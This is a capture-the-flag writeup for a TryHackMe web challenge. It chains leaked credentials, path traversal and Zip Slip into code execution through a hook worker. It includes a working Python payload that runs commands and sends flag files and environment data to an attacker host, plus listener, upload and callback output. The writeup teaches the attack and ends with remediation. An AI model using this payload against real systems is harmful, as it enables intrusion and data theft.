# The Hollow Shell CTF Writeup

| Field       | Details                                      |
|-------------|----------------------------------------------|
| Challenge   | The Hollow Shell                             |
| Category    | Web                                          |
| Difficulty  | Medium                                       |
| Points      | 90                                           |
| Platform    | TryHackMe                                    |
| Flag        | `THM{z1p_sl1pp3d_1nt0_a_sh3ll}`             |

---

## Overview

The Hollow Shell is a medium-difficulty web challenge centred on a fictional hotel
property-management portal called **Byte Lotus Shoreline Display**. Staff upload
`.zip` archives ("shells") that set ambient displays in guest rooms. A background
worker process picks up automation hooks delivered inside those archives and
executes them. The challenge requires chaining two weaknesses — a path-traversal
flaw in the zip extraction routine (Zip Slip) and unrestricted hook execution by
the theme worker — to achieve remote code execution and exfiltrate the flag.

---

## Reconnaissance

### Port Enumeration

An initial port scan revealed that port 80 was closed. A full TCP scan identified
the two open ports:

```
22/tcp  open  ssh
5000/tcp open  (Gunicorn / Python Flask)
```

The web application was served by Gunicorn on port 5000.

### Application Enumeration

Navigating to `http://<target>:5000/` redirected to `/login`, presenting a
staff sign-in form. Inspection of the login page's HTML source revealed a
developer comment containing hardcoded credentials:

```html
<!--
  Byte Lotus // internal display-manager portal
  New on the floor team? IT seeds every property with the same
  starter login until you set your own:
      user: concierge
      pass: StayNoticed2024!
  (rotate it from Settings on first sign-in -- most people forget)
-->
```

**Credentials discovered:** `concierge : StayNoticed2024!`

---

## Authentication

Logging in with the discovered credentials granted access to the dashboard at
`/dashboard`. The dashboard exposed a file upload form that accepted `.zip`
archives and described the "automation hooks" feature:

> "A shell may include optional automation hooks — the theme worker applies these
> for you shortly after the shell comes ashore, so you don't have to touch each
> tablet by hand. Allowed asset types: png jpg gif svg css json"

Uploaded archives were stored under `shells/<shell_id>/` and their assets were
served via `/shells/<shell_id>/<asset>`.

---

## Source Code Discovery

### Path Traversal in the Shell Asset Route

The asset-serving route was defined as:

```
/shells/<shell_id>/<path:asset>
```

Testing the URL `GET /shells/..%2fapp.py` (where `%2f` is a URL-encoded forward
slash decoded by Werkzeug) caused Flask to evaluate:

```python
shell_dir = os.path.join(SHELLS_DIR, "..")          # resolves to /app/static/
send_from_directory(shell_dir, "app.py")             # serves /app/static/app.py
```

This exposed the full Flask application source at `app.py` and subsequently
allowed retrieval of `theme_worker.py`.

### app.py — Extract Shell Function

The relevant extraction routine contained no path sanitisation:

```python
def extract_shell(zf, shell_dir):
    os.makedirs(shell_dir, exist_ok=True)
    written = []
    for name in zf.namelist():
        if name.endswith("/"):
            continue
        dest = os.path.join(shell_dir, name)
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, "wb") as fh:
            fh.write(zf.read(name))
        written.append(name)
    return written
```

`os.path.join` does not normalise path components. A zip entry named
`../../hooks/evil.py` would therefore resolve to:

```
/app/static/shells/<id>/../../hooks/evil.py  →  /app/static/hooks/evil.py
```

This is the classic **Zip Slip** vulnerability.

### theme_worker.py — Hook Execution

Retrieving `GET /shells/..%2ftheme_worker.py` exposed the worker process:

```python
BASE_DIR  = os.path.dirname(os.path.abspath(__file__))
HOOKS_DIR = os.path.join(BASE_DIR, "hooks")          # /app/static/hooks/
POLL_SECONDS = int(os.environ.get("THEME_WORKER_POLL", "20"))

def run_pending_hooks():
    for path in sorted(glob.glob(os.path.join(HOOKS_DIR, "*.py"))):
        try:
            with open(path, "rb") as fh:
                code = fh.read()
        except OSError:
            continue
        try:
            os.remove(path)
        except OSError:
            pass
        try:
            proc = subprocess.Popen(
                [sys.executable, "-"],
                stdin=subprocess.PIPE,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            proc.stdin.write(code)
            proc.stdin.close()
        except Exception:
            pass

def main():
    while True:
        run_pending_hooks()
        time.sleep(POLL_SECONDS)
```

**Key observations:**

- The worker polls `/app/static/hooks/` every 20 seconds for `*.py` files.
- Each discovered file is read into memory, deleted from disk, then executed by
  piping its content to a new `python3 -` subprocess.
- Standard output and standard error are discarded, so output must be exfiltrated
  out-of-band.

---

## Exploitation

### Step 1 — Craft the Malicious ZIP

A ZIP archive was constructed containing a Python hook script placed at the
path-traversal destination `../../hooks/exploit.py`. This path resolves during
extraction to `/app/static/hooks/exploit.py`, which the worker will pick up on
its next polling cycle.

The hook established a TCP connection back to the attacker machine and transmitted
command output:

```python
# hook payload (../../hooks/exploit.py inside the ZIP)
import subprocess, socket

r = subprocess.run(
    'id; cat /flag /flag.txt 2>/dev/null; '
    'find / -maxdepth 6 -name "flag*" 2>/dev/null | xargs cat 2>/dev/null; '
    'env',
    shell=True, capture_output=True, text=True
)
output = (r.stdout + r.stderr).encode()

try:
    s = socket.socket()
    s.settimeout(10)
    s.connect(('<ATTACKER_IP>', 4444))
    s.sendall(output)
    s.close()
except Exception:
    pass
```

The corresponding `shell.json` manifest was included to satisfy application
validation:

```json
{
  "name": "NetHook",
  "version": "1.0",
  "assets": ["i.png"]
}
```

The `validate_manifest` function only inspects the `assets` list for permitted
file extensions. Zip entries not listed in `assets` are extracted without any
additional checks, making the traversal payload transparent to validation.

### Step 2 — Open a Listener

```bash
nc -lvnp 4444 | tee /tmp/callback.txt
```

### Step 3 — Upload the Archive

```bash
curl -b session.txt \
     -X POST http://<target>:5000/upload \
     -F "shell=@exploit.zip;type=application/zip"
```

### Step 4 — Wait for Worker Execution

After approximately 20 seconds the theme worker polled the hooks directory,
read and deleted `exploit.py`, then executed it. The reverse connection arrived:

```
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 54748
uid=996(roomservice) gid=996(roomservice) groups=996(roomservice)
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
/flag
USER=roomservice
HOME=/home/roomservice
PWD=/var/www/conch
...
```

---

## Vulnerability Summary

| Vulnerability            | Location                      | Impact                                  |
|--------------------------|-------------------------------|-----------------------------------------|
| Hardcoded credentials    | `login.html` HTML comment     | Full authentication bypass              |
| Zip Slip (path traversal)| `extract_shell()` in `app.py` | Arbitrary file write on the server      |
| Unrestricted code exec   | `theme_worker.py`             | Remote code execution as `roomservice`  |
| Path traversal in route  | `/shells/<shell_id>/` route   | Arbitrary file read from server         |

---

## Flag

```
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## Remediation

1. **Credentials:** Remove hardcoded credentials from source code and HTML.
   Use environment variables or a secrets manager.

2. **Zip Slip:** Validate that every extracted path is contained within the
   intended destination directory before writing:

   ```python
   import os

   def safe_extract(zf, dest_dir):
       dest_dir = os.path.realpath(dest_dir)
       for member in zf.namelist():
           target = os.path.realpath(os.path.join(dest_dir, member))
           if not target.startswith(dest_dir + os.sep):
               raise ValueError(f"Unsafe path in archive: {member}")
           # proceed with extraction
   ```

3. **Hook execution:** If automation hooks are a legitimate feature, they should
   be sandboxed (e.g., restricted user, seccomp, container namespace) and
   validated against a strict allowlist rather than executed as arbitrary Python.

4. **Path traversal in asset route:** Validate that `shell_id` is a known,
   registered identifier before constructing `shell_dir`. Do not allow user-
   supplied values to traverse outside the shells directory.
